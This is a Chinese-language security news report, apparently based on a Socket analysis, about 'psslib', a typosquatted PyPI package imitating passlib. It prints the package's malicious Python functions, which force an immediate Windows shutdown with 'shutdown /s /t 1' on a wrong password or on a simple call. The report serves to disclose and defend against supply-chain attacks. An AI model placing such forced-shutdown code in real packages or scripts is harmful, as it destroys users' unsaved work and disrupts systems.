иҜҘиҪҜд»¶еҢ…з”ұеЁҒиғҒиЎҢдёәиҖ…дҪҝз”ЁеҲ«еҗҚ umaraq зј–еҶҷпјҢжҳҜеҗҲжі• passlib еә“зҡ„жӢјеҶҷй”ҷиҜҜпјҢpasslib еә“жҳҜж•°зҷҫдёҮејҖеҸ‘дәәе‘ҳдҝЎиө–зҡ„е№ҝжіӣдҪҝз”Ёзҡ„еҜҶз Ғе“ҲеёҢе·Ҙе…·еҢ…гҖӮ

вҖңжҒ¶ж„Ҹ psslib еҢ…йҖҡиҝҮе°ҶиҮӘе·ұдјӘиЈ…жҲҗе®үе…Ёе®һз”ЁзЁӢеәҸжқҘеҲ©з”Ёиҝҷз§ҚдҝЎд»»пјҢеҗҢж—¶еҢ…еҗ«еҸҜиғҪеҜјиҮҙз«ӢеҚіж•°жҚ®дёўеӨұе’Ңзі»з»ҹдёӯж–ӯзҡ„д»Јз ҒпјҢвҖқSocketВ жҠҘе‘ҠиЎЁзӨәгҖӮ

ж”»еҮ»д»ҺдёҖдёӘеҗҚз§°жҠҖе·§ејҖе§Ӣпјҡpsslib дёҺ passlib йқһеёёзӣёдјјпјҢеҸҜиғҪеёҢжңӣж¬әйӘ—еҝ«йҖҹй”®е…ҘжҲ–дҫқиө–иҮӘеҠЁе®ҢжҲҗзҡ„ејҖеҸ‘дәәе‘ҳгҖӮpasslib жҜҸжңҲдёӢиҪҪйҮҸи¶…иҝҮ 890 дёҮж¬ЎгҖӮ

вҖңSocket зҡ„ AI Scanner е°Ҷ psslib ж Үи®°дёәжҒ¶ж„ҸпјҢеӣ дёәе®ғе…·жңүз ҙеқҸжҖ§зҡ„зі»з»ҹе…ій—ӯиЎҢдёәгҖӮвҖқ

еҜје…ҘеҗҺпјҢз”ұдәҺеҜҶз Ғиҫ“е…Ҙй”ҷиҜҜиҖҢи§ҰеҸ‘пјҢpsslib е°Ҷжү§иЎҢ Windows е…іжңәе‘Ҫд»Ө пјҲshutdown /s /t 1пјүпјҢдҪҝи®Ўз®—жңәеңЁ 1 з§’еҶ…е…ій—ӯз”өжәҗгҖӮ

иҜҘиҪҜд»¶еҢ…еҒҮиЈ…йҖҡиҝҮеҗҚдёә spcпјҲпјү зҡ„еҮҪж•°жҸҗдҫӣеҜҶз ҒдҝқжҠӨпјҢе№¶дҪҝз”Ё easygui.enterboxпјҲпјү иҝӣиЎҢз”ЁжҲ·иҫ“е…ҘгҖӮеҰӮжһңз”ЁжҲ·иҫ“е…ҘдёҺйў„и®ҫеҖјдёҚеҢ№й…ҚпјҢе®ғе°Ҷз«ӢеҚіе…ій—ӯзі»з»ҹгҖӮ

```
def spc(password):
    # Malicious code: Forces immediate system shutdown on incorrect input
    if easygui.enterbox('enter password:-') != password:
        os.system("shutdown /s /t 1")  # Shutdown in 1 second
```

йҷӨжӯӨд№ӢеӨ–пјҢpsslib иҝҳеҢ…жӢ¬еҸҰеӨ–дёӨдёӘеҮҪж•° вҖ” srcпјҲпјү е’Ң errorпјҲпјү вҖ” е®ғд»¬ж №жң¬дёҚеңЁиҝӣиЎҢд»»дҪ•иә«д»ҪйӘҢиҜҒзҡ„жғ…еҶөдёӢе…ій—ӯзі»з»ҹгҖӮ

```
def src():
    # Directly forces system shutdown without user input
    os.system("shutdown /s /t 1")

def error(message):
    # Writes an error message and forces system shutdown
    sys.stderr.write(message)
    os.system("shutdown /s /t 1")
```

иҝҷдәӣйўқеӨ–зҡ„еҗ‘йҮҸзЎ®дҝқеҚідҪҝеҜ№еә“зҡ„жңүйҷҗдҪҝз”Ёд№ҹеҸҜиғҪз«ӢеҚіеҚұеҸҠејҖеҸ‘дәәе‘ҳзҡ„и®Ўз®—жңәпјҢе°Өе…¶жҳҜеңЁд»ҘжҸҗеҚҮзҡ„жқғйҷҗиҝҗиЎҢзҡ„зҺҜеўғдёӯгҖӮ

Socket жҢҮеҮәпјҢиҜҘжҒ¶ж„ҸиҪҜд»¶дё“й—Ёй’ҲеҜ№еҹәдәҺ Windows зҡ„ејҖеҸ‘зҺҜеўғпјҢеңЁиҝҷдәӣзҺҜеўғдёӯпјҢе…ій—ӯе‘Ҫд»Өжңүж•Ҳдё”з»Ҹеёёиў«еҝҪи§ҶгҖӮиҷҪз„¶з”ұдәҺдҪңзі»з»ҹе‘Ҫд»Өе·®ејӮпјҢжңүж•ҲиҙҹиҪҪеңЁ Linux жҲ– macOS дёҠж— е®іең°еӨұиҙҘпјҢдҪҶиҜҘиҪҜд»¶еҢ…зҡ„ Windows зү№е®ҡжҖ§иҙЁиЎЁжҳҺдәҶзӣ®ж Үж„ҸеӣҫгҖӮ

вҖңж”»еҮ»жҳҜе®Ңе…Ёжңүж•Ҳзҡ„гҖӮshutdown е‘Ҫд»ӨжҢүйў„жңҹжү§иЎҢпјҢејәеҲ¶з«ӢеҚіе…ій—ӯзі»з»ҹпјҢиҝҷеҸҜиғҪеҜјиҮҙпјҡжңӘдҝқеӯҳзҡ„е·ҘдҪңе’Ңж•°жҚ®дёўеӨұгҖҒжү“ејҖзҡ„ж–Үд»¶е’Ңж•°жҚ®еә“жҚҹеқҸд»ҘеҸҠжӯЈеңЁиҝҗиЎҢзҡ„жңҚеҠЎдёӯж–ӯгҖӮ
